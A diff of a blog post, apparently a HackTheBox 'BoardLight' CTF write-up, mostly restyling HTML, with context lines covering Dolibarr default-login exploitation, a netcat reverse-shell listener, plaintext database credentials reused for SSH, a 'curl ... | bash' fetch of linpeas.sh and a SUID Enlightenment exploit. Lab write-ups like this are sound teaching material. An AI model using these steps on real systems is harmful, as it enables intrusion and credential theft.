@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "BoardLight - HackTheBox WriteUp"
-date: 2024-04-15
+date: 2024-09-19
 categories: [CTF, HackTheBox, WriteUp]
 tags: [WebApp, CMS, Dolibarr, CVE-2023-30253, PrivEsc, SUID, CVE-2022-37706, Linux]
 difficulty: Easy
@@ -12,56 +12,69 @@ permalink: /en/blog/2024/04/15/boardlight-htb-writeup/
 excerpt: "Linux machine exposing a vulnerable Dolibarr 17.0.0 instance. CVE-2023-30253 exploitation for RCE, then privilege escalation via SUID Enlightenment (CVE-2022-37706)."
 ---
 
-<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-8 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
-    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
-        <div class="flex-1">
-            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
-                <i class="fas fa-cube mr-3"></i>BoardLight
-            </h2>
-            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
-                Dolibarr 17.0.0 Exploitation + SUID Privilege Escalation
-            </p>
-        </div>
-        <div class="flex gap-3">
-            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
-                <i class="fas fa-circle text-xs mr-1"></i>Easy
-            </span>
-            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
-                <i class="fab fa-linux mr-1"></i>Linux
-            </span>
-        </div>
+<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
+  <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
+    <div class="flex-1">
+      <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
+        <i class="fas fa-cube mr-3"></i>BoardLight
+      </h2>
+      <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
+        Dolibarr 17.0.0 Exploitation + SUID Privilege Escalation
+      </p>
     </div>
-    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
-        <div class="flex items-center gap-2">
-            <i class="fas fa-calendar text-green-500"></i>
-            <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">04/15/2024</div>
-            </div>
-        </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-network-wired text-blue-500"></i>
-            <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Target IP</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">10.10.11.11</div>
-            </div>
-        </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-shield-alt text-purple-500"></i>
-            <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">Ubuntu 20.04</div>
-            </div>
-        </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-star text-amber-500"></i>
-            <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">20</div>
-            </div>
-        </div>
+    <div class="flex gap-3">
+      <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
+        <i class="fas fa-circle text-xs mr-1"></i>Easy
+      </span>
+      <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
+        <i class="fab fa-linux mr-1"></i>Linux
+      </span>
     </div>
+  </div>
+
+  <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
+    <div class="flex items-center gap-3">
+      <div class="text-green-500 text-xl">
+        <i class="fas fa-calendar"></i>
+      </div>
+      <div>
+        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
+        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2024-09-19</div>
+      </div>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <div class="text-blue-500 text-xl">
+        <i class="fas fa-network-wired"></i>
+      </div>
+      <div>
+        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
+        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.11.11</div>
+      </div>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <div class="text-purple-500 text-xl">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+      <div>
+        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
+        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Ubuntu 20.04</div>
+      </div>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <div class="text-amber-500 text-xl">
+        <i class="fas fa-star"></i>
+      </div>
+      <div>
+        <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
+        <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
+      </div>
+    </div>
+  </div>
 </div>
+
 
 ## 🎯 Synopsis
 
@@ -69,7 +82,7 @@ excerpt: "Linux machine exposing a vulnerable Dolibarr 17.0.0 instance. CVE-2023
 
 Exploiting this vulnerability allows obtaining <span class="text-highlight-blue">**initial access**</span> as the web user `www-data`. System enumeration reveals <span class="text-highlight-red">**plaintext credentials**</span> in the Dolibarr configuration file, allowing SSH connection with the `larissa` user. Finally, privilege escalation is achieved via exploiting the <span class="text-highlight-purple">**SUID Enlightenment**</span> binary affected by <span class="text-highlight-orange">**CVE-2022-37706**</span>, leading to a <span class="text-highlight-green">**root shell**</span>.
 
-<div class="grid md:grid-cols-2 gap-6 my-10">
+<div class="grid md:grid-cols-2 gap-6 my-4">
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
         <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
             <i class="fas fa-brain mr-2"></i>Required Skills
@@ -114,7 +127,7 @@ ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11 | grep '^[0-9]' | cut -d'/'
 nmap -p$ports -Pn -sC -sV 10.10.11.11
 ```
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
+<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
     <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
         <i class="fas fa-search mr-2"></i>Scan Results
     </h4>
@@ -199,8 +212,8 @@ echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
 
 Accessing `http://crm.board.htb/`, we discover a **Dolibarr ERP/CRM** authentication interface.
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
-    <div class="flex items-center gap-4 mb-4">
+<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-blue-500">
+    <div class="flex items-start gap-4 mb-4">
         <div class="text-4xl text-blue-500">
             <i class="fas fa-building"></i>
         </div>
@@ -226,7 +239,7 @@ Password: admin
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200">
         <i class="fas fa-unlock mr-2 text-green-500"></i>
-        <strong>Authentication Successful\!</strong> Default credentials were never changed.
+        <strong>Authentication Successful!</strong> Default credentials were never changed.
     </p>
 </div>
 
@@ -301,7 +314,7 @@ nc -lnvp 4455
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-terminal mr-2 text-green-500"></i>
-        Shell obtained as www-data\!
+        Shell obtained as www-data!
     </p>
 </div>
 
@@ -332,14 +345,14 @@ Web applications often store credentials in their configuration files. We examin
 cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
 ```
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
+<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
     <h4 class="text-xl font-bold mb-4 text-green-600 dark:text-green-400 flex items-center">
         <i class="fas fa-key mr-2"></i>Discovered Credentials
     </h4>
     <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm">
         <div class="text-gray-700 dark:text-gray-300">
             <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_user</span>=<span class="text-green-600 dark:text-green-400">'dolibarrowner'</span>;<br>
-            <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_pass</span>=<span class="text-green-600 dark:text-green-400">'serverfun2$2023\!\!'</span>;
+            <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_pass</span>=<span class="text-green-600 dark:text-green-400">'serverfun2$2023!!'</span>;
         </div>
     </div>
 </div>
@@ -347,7 +360,7 @@ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200">
         <i class="fas fa-check-circle mr-2 text-green-500"></i>
-        <strong>Plaintext Credentials Found\!</strong> These credentials are potentially reused elsewhere on the system.
+        <strong>Plaintext Credentials Found!</strong> These credentials are potentially reused elsewhere on the system.
     </p>
 </div>
 
@@ -378,12 +391,12 @@ Attempting SSH connection with the discovered password:
 ssh larissa@board.htb
 ```
 
-**Password:** `serverfun2$2023\!\!`
+**Password:** `serverfun2$2023!!`
 
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-check-circle mr-2 text-green-500"></i>
-        SSH Connection Successful\!
+        SSH Connection Successful!
     </p>
 </div>
 
@@ -409,7 +422,7 @@ cat ~/user.txt
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200">
         <i class="fas fa-flag mr-2 text-green-500"></i>
-        <strong>User Flag Obtained\!</strong> First step completed.
+        <strong>User Flag Obtained!</strong> First step completed.
     </p>
 </div>
 
@@ -433,7 +446,7 @@ curl http://10.10.14.41:3000/linpeas.sh | bash
 
 LinPEAS identifies several interesting SUID binaries:
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
+<div class="bg-red-50 dark:bg-red-900/20 p-5 rounded-xl shadow-lg my-4 border-l-4 border-red-500">
     <h4 class="text-xl font-bold mb-4 text-red-600 dark:text-red-400 flex items-center">
         <i class="fas fa-exclamation-triangle mr-2"></i>Suspicious SUID Binaries Detected
     </h4>
@@ -517,8 +530,8 @@ chmod +x exploit.sh
 
 <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
     <div class="text-green-600 dark:text-green-400">
-        [+] Vulnerable SUID binary found\!<br>
-        [+] Trying to pop a root shell\!<br>
+        [+] Vulnerable SUID binary found!<br>
+        [+] Trying to pop a root shell!<br>
         [+] Enjoy the root shell :)
     </div>
 </div>
@@ -537,9 +550,9 @@ whoami
 </div>
 
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
-    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
+    <p class="text-green-800 dark:text-green-200">
         <i class="fas fa-crown mr-2 text-amber-500"></i>
-        ROOT SHELL OBTAINED\! Maximum privileges achieved.
+        <strong>ROOT SHELL OBTAINED!</strong> Maximum privileges achieved.
     </p>
 </div>
 
@@ -559,7 +572,7 @@ cat /root/root.txt
             <i class="fas fa-trophy"></i>
         </div>
         <div class="flex-1">
-            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
+            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
             <p class="text-gray-700 dark:text-gray-300">
                 <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> /home/larissa/user.txt<br>
                 <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> /root/root.txt
@@ -570,7 +583,7 @@ cat /root/root.txt
 
 ## 📋 Phase 10 — Recommendations and Remediation
 
-<div class="grid md:grid-cols-2 gap-6 my-8">
+<div class="grid md:grid-cols-2 gap-6 my-4">
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
         <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
             <i class="fas fa-globe mr-2"></i>Application
@@ -657,34 +670,34 @@ chmod +x exploit.sh
 
 ## 🔗 Attack Chain Summary
 
-<div class="bg-white dark:bg-dark-navbar p-8 rounded-xl shadow-lg my-8">
-    <h3 class="text-2xl font-bold text-portfolio-violet mb-6 flex items-center">
+<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
+    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
         <i class="fas fa-project-diagram mr-3"></i>Complete Attack Path
     </h3>
     <div class="space-y-4">
-        <div class="flex items-center gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
-            <div class="text-3xl font-bold text-blue-500">1</div>
+        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
+            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
             <div class="flex-1">
                 <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and Enumeration</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → board.htb → ffuf → crm.board.htb</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
-            <div class="text-3xl font-bold text-green-500">2</div>
+        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
+            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
             <div class="flex-1">
                 <div class="font-bold text-green-600 dark:text-green-400">Exploitation and Initial Access</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">Default creds (admin:admin) → CVE-2023-30253 → www-data shell</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
-            <div class="text-3xl font-bold text-purple-500">3</div>
+        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
+            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
             <div class="flex-1">
                 <div class="font-bold text-purple-600 dark:text-purple-400">Enumeration and Pivoting</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">conf.php → plaintext creds → SSH larissa</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
-            <div class="text-3xl font-bold text-red-500">4</div>
+        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
+            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
             <div class="flex-1">
                 <div class="font-bold text-red-600 dark:text-red-400">Privilege Escalation</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2022-37706 → SUID Enlightenment → Root shell</div>
